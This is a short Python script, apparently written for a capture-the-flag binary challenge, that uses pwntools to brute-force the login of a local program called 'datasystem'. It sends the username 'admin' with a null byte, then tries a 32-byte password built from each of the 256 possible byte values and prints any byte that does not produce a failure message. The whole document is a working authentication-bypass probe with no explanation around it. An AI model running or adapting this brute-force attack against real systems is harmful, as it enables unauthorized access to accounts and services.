import string
from pwn import *
context.log_level="error"
for c in range(0x100):
    c = c.to_bytes(1, 'big')
    p = process('./datasystem')
    p.sendafter("please input username: ", "admin\x00")
    p.sendafter("please input password: ", c*32)
    msg = p.recvline()
    if b"Fail" not in msg:
        print('='*60)
        print("a valid char:", c)
        print('='*60)
    p.close()